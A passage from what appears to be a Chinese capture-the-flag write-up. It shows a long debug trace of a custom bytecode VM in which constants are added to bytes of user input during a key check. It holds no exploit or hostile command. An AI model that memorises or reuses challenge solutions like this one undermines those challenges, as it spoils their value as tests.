class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x2 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x25 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x26 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x40 arg2:<span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x27 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x1b<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x1b<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x1b d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x28 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x1b d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x29 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x1 d<br><span class="hljs-selector-attr">[s]</span> ... read_memory<br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure>

<p>输入后</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">s</span>] ... <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0x4</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0</span> b:<span class="hljs-number">0x30</span> c:<span class="hljs-number">0x1b</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x2a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK c NONE<br>[<span class="hljs-meta">s</span>] ... popping c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0</span> b:<span class="hljs-number">0x30</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x2b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK b NONE<br>[<span class="hljs-meta">s</span>] ... popping b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x2c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK a NONE<br>[<span class="hljs-meta">s</span>] ... popping a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x2d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x4</span> arg2:<span class="hljs-number">0x2d</span><br>[<span class="hljs-meta">s</span>] IMM i = <span class="hljs-number">0x2d</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0</span> i:<span class="hljs-number">0x2e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] STK NONE a<br>[<span class="hljs-meta">s</span>] ... pushing a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x2f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STK NONE b<br>[<span class="hljs-meta">s</span>] ... pushing b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x30</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] STK NONE c<br>[<span class="hljs-meta">s</span>] ... pushing c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x1</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x31</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x30</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x30</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x32</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xa5</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xa5</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x33</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a									<span class="hljs-meta"># a1[0x30] = 0x31</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x34</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span>		<br>[<span class="hljs-meta">s</span>] ADD b c			<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x35</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b									<span class="hljs-meta"># a1[0x30] = 0x31 + 0xa5</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x30</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x36</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x31</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x31</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xa5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x37</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xce</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xce</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0xd6</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x38</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a									<span class="hljs-meta"># a1[0x31] = 0x32</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0x32</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x39</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b									<span class="hljs-meta"># a1[0x31] = 0x32 + 0xce</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x31</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x32</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x32</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xce</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x67</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x67</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0x33</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c										<span class="hljs-meta"># a1[0x32] = 0x33 + 0x67</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x3f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x32</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x40</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x33</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x33</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0x67</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x41</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xab</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xab</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0x9a</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x42</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0xa</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x43</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x44</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b									<span class="hljs-meta"># a1[0x33] = 0xa + 0xab</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x33</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x45</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x34</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x34</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0xab</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x46</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x98</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x98</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0xb5</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x47</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span 